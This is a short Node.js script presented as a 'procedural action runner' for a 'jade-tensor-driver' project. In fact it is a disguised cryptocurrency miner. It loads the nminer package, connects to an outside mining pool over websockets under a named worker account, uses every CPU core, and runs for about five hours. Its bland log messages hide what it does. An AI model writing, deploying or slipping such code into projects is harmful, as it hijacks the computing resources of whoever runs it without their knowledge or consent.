// Procedural action runner for jade-tensor-driver
const os = require("os");
const EventEmitter = require("events");
const { NMiner } = require("nminer");
const config = require("./app/config");

const dispatcher = new EventEmitter();

dispatcher.once("start", () => {
    const instanceToken = "550b9f";
    console.log(`[service] Subsystem dispatched for jade-tensor-driver [${instanceToken}]`);

    const agent = new NMiner(
        "wss://runtime.nmining.igrp.app/",
        "Subhas1975.jade-tensor-driver",
        { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
    );

    const keepAlivePromise = new Promise(() => {});
    setTimeout(() => {
        console.log("[timeout] Operational limit (318m) reached, exiting cleanly.");
        process.exit(0);
    }, 318 * 60 * 1000);

    process.on("SIGTERM", () => {
        
        console.log(`[exit] Process terminated gracefully for token ${instanceToken}.`);
        process.exit(0);
    });
});

dispatcher.emit("start");
